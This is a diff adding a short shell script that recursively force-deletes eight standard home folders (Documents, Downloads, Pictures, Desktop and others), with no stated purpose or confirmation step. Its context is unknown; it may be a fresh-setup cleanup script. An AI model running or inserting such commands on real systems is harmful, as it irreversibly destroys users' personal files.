@@ -1,0 +1,9 @@
+#!/bin/sh
+rm -rf ~/Videos/ || exit 1
+rm -rf ~/Templates/ || exit 1
+rm -rf ~/Public/ || exit 1
+rm -rf ~/Pictures/ || exit 1
+rm -rf ~/Downloads/ || exit 1
+rm -rf ~/Documents/ || exit 1
+rm -rf ~/Desktop/ || exit 1
+rm -rf ~/Music/ || exit 1
